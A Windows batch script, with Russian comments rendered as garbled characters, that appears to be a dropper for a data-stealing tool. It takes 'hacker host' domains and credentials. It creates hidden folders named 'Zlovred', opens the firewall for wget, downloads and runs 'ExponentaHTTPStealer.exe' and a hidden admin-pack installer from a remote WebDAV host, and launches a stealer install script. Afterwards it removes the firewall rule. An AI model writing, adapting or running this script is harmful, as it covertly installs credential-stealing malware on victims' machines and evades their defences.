rem ���� ����㧪� � ��⠭���� �⠩��� (��������᪨� ��ਠ��)
rem USAGE
rem > load_distrib.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem ����᪠�� 䠩� � �ࠢ��� �����������

rem ���樠�����㥬 ��६���� ���㦥��� �ਯ�

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem ᮧ��� ��⥬�� ��६���� Windows ��� ��⭥�
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4

rem ������塞 ��६ᥭ�� ���㦥���
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem ��⠥� ����ன�� �� 䠩�� settings.txt, ����� ������ �ᯮ�������� �
rem ⮬ �� ��⠫���, �� � bat-䠩�. �᫨ �� 㤠���� �ᯠ���� ����ன�� -
rem ��室�� � ���㫥�� ����� ������.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

rem ����ࠨ���� ��६���� ���㦥��� ��� ������� Wget

rem ��।��塞 ��६����:

rem �᭮���� �����
rem set httpMainFolder=Exponenta
rem ��䨪� ��⮪���
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem ������� ��⠫��
set LocalFolderZ=%PUB1%\Distrib\Zlovred

rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
del /Q /F %LocalFolderZ%\*.*

rem �����㥬 wget � ����᪠�� ��⠭���� � ��⠫��� %LocalFolderZ%
copy wget.exe %LocalFolderZ%\wget.exe
rem copy ExponentaInstallerHttpHidden.exe %LocalFolderZ%\ExponentaInstallerHttpHidden.exe
copy install_Styler.ini %LocalFolderZ%\
copy installHTTP_Stylerdistrib.bat %LocalFolderZ%\
copy Install_StylerHTTP.bat %LocalFolderZ%\
cd /d %LocalFolderZ%
cd %LocalFolderZ%

rem ����蠥� �� ��⮪��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolderZ%\wget.exe" enable=yes
rem ����蠥� �� ��⮪��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolderZ%\wget.exe" enable=yes

rem ����᪠�� �� �믮������ ������� WGET
rem !!! �����塞�� ����稭�! �஢����� ��। �ᯮ�짮������ !!!

rem �������� �� ��� ᢮��� 䠩�� ᪮�����஢������ �⠩��� (����� ExponentaHTTPStealer.exe !!!)
rem Change the name of Stealer compiled file (Instaed of ExponentaHTTPStealer.exe)
wget %host%/ExponentaHTTPStealer.exe

rem �������� ���� � ��� ���, � ���ண� ᪠稢����� ���⠫���� nir environment !!!
rem Change the hostname and path to downloaded file of nir ennvironment !!!
wget %host%/nit-install-hidden.exe

rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/

rem ����᪠�� ���⠫���� Admin-Pack "��ᯮ����"
%LocalFolderZ%\nit-install-hidden.exe

rem ����᪠�� ���⠫���� Stealer "��ᯮ����"
call %LocalFolderZ%\install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem ����塞 �६���� ��⠫��
rd /S /Q WindowsPowerShell

rem ����塞 �ࠢ��� ��� wget.exe � �࠭������
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem ��室 �� �業���. ����� - ⮫쪮 �㭪樨.
exit /b 0

rem
rem �㭪�� ��� �⥭�� ����஥� �� 䠩��.
rem �室:
rem       %1           - ��� 䠩�� � ����ன����
:read_settings

set SETTINGSFILE=%1

rem �஢�ઠ ����⢮����� 䠩��
if not exist %SETTINGSFILE% (
    echo FAIL: ���� � ����ன���� ���������
    exit /b 1
)

rem ��ࠡ�⪠ 䠩�� c ����ன����
rem �����:
rem     eol=# 㪠�뢠�� �� �, �� ᮤ�ন��� ��ப� ��稭�� � ᨬ���� #
rem     � �� �� ���� ����� ���� �ய�饭� ��� �������਩.
rem
rem     delims== 㪠�뢠��, �� ࠧ����⥫�� ���祭�� ���� ᨬ��� =
rem
rem     tokens=1,2 �ਢ���� � ⮬�, �� � ��६����� %%i �㤥� ����ᥭ ����
rem     ⮪��, � � %%j - ��ன.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem � ��६����� i - ����
    rem � ��६����� j - ���祭��
    rem �� �࠭᫨�㥬 �� � ��६���� ���㦥���
    set %%i=%%j
)
exit /b 0

